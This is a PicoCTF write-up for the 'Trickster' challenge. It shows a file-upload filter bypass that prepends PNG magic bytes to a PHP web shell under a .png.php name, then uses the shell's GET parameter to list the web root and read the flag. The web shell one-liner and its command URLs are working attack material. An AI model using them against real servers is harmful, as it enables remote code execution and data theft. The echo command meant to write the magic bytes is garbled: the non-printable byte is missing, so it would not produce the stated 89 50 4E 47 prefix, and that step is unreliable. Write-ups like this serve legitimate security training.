---
layout: post
title: "Trickster"
date: 2025-07-30
categories: [PicoCTF, Web Exploitation]
tags: [picoctf, webexploitation, file-upload, magic-bytes, rce, php, ctf, Medium]
author: Harshith
description: A PicoCTF web exploitation challenge demonstrating file upload filter bypass using PNG magic bytes to deploy a PHP web shell and achieve Remote Code Execution.
toc: true
---

## Introduction

The **Trickster** challenge on PicoCTF demonstrates a file upload bypass attack — a critical web vulnerability where insufficient upload validation can be exploited to upload malicious server-side code. By prepending valid PNG magic bytes to a PHP web shell, we bypass the upload filter and achieve Remote Code Execution (RCE).

> **Challenge Description:** "I found a web app that can help process images: PNG images only!"

---

## Challenge Overview

| Field | Details |
|---|---|
| **Platform** | PicoCTF |
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Technique** | File Upload Bypass, Magic Bytes, PHP Web Shell, RCE |

---

## Environment Setup

**Required Tools:**
- A modern web browser (Chrome or Firefox)
- Linux terminal with `echo`, `xxd`, `curl`

---

## Reconnaissance

### Step 1: Explore the Website

Navigate to the challenge URL. The site accepts PNG image uploads. Initial tests show it validates both file extension and file content.

### Step 2: Check `robots.txt`

Navigate to `/robots.txt`:

```
/robots.txt
```

Output reveals:
```
/information.txt
/uploads/
```

### Step 3: Read `/information.txt`

Navigate to `/information.txt`. The file confirms the validation logic:

```
Requirements:
1. Allow users to upload PNG images
2. Check file extension (must be .png)
3. Validate magic bytes (hex: 89 50 4E 47)
4. Store the validated files securely
```

This means the server checks both the file extension **and** the PNG magic bytes header.

---

## Attack Simulation

### Step 4: Create a PHP Web Shell with PNG Magic Bytes

Standard PHP files fail both checks. The bypass is to prepend valid PNG magic bytes to the PHP payload:

```bash
# Step 1: Write PNG magic bytes followed by PHP payload
echo -ne "PNG

" > vuln.png.php
echo '<?php echo shell_exec($_GET[0]); ?>' >> vuln.png.php
```

Verify the magic bytes are correct:

```bash
xxd vuln.png.php | head
```

Expected output prefix: `89 50 4e 47` (PNG magic bytes).

### Step 5: Upload the Crafted File

Upload `vuln.png.php` through the web interface. The server accepts it, seeing valid PNG magic bytes at the start.

### Step 6: Execute the Web Shell

Navigate to the uploaded file:

```
/uploads/vuln.png.php?0=ls /var/www/html
```

Server output lists the web root contents:
```
MQZWCYZWGI2WE.txt
index.php
instructions.txt
robots.txt
uploads
```

### Step 7: Read the Flag File

```
/uploads/vuln.png.php?0=cat /var/www/html/MQZWCYZWGI2WE.txt
```

The flag is returned in the HTTP response.

---

## Key Concepts

**What are Magic Bytes?**

Magic bytes are the first few bytes of a file that identify its format. For PNG files, the magic bytes are:

```
89 50 4E 47 0D 0A 1A 0A
```

Validators that check only magic bytes (without verifying full file structure) can be bypassed by prepending these bytes to any malicious payload.

**PHP Web Shell:**

```php
<?php echo shell_exec($_GET[0]); ?>
```

This one-liner executes any OS command passed via the `0` GET parameter and returns the output to the HTTP response.

---

## Detection Logs

If security logging were enabled, this attack would generate:

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data
-- File: vuln.png.php (size: 47 bytes)
-- Magic bytes: 89 50 4E 47 (VALID PNG)
-- Extension: .png.php (BYPASS: double extension)

GET /uploads/vuln.png.php?0=cat+/var/www/html/MQZWCYZWGI2WE.txt
-- Remote Code Execution confirmed
```

---

## Flag

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

---

## Security Insights

- **Never rely on magic byte checks alone:** A complete file format validation requires parsing the full file structure, not just the first few bytes.
- **Restrict file storage:** Uploaded files should never be stored in a web-accessible directory — use a private storage location outside the web root.
- **Disable script execution in upload directories:** Configure your web server to deny PHP (and other script) execution in the uploads directory.
- **Use an allowed MIME type allowlist:** Validate content type both client-side and server-side using a whitelist approach.
- **Rename uploaded files:** Never preserve the original file extension — generate a random UUID-based filename without any extension.

---

## Conclusion

This challenge demonstrates a sophisticated two-layer file upload bypass: fooling the magic byte validator with PNG header prepending and exploiting double extension handling to execute PHP code. The vulnerability results in full Remote Code Execution (RCE) on the server — one of the most severe web application vulnerability classes.

---

## References

- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Magic Numbers — Wikipedia](https://en.wikipedia.org/wiki/Magic_number_(programming)#In_files)
- [PHP Web Shells — PortSwigger](https://portswigger.net/web-security/file-upload)
- [PicoCTF Official Platform](https://picoctf.org)
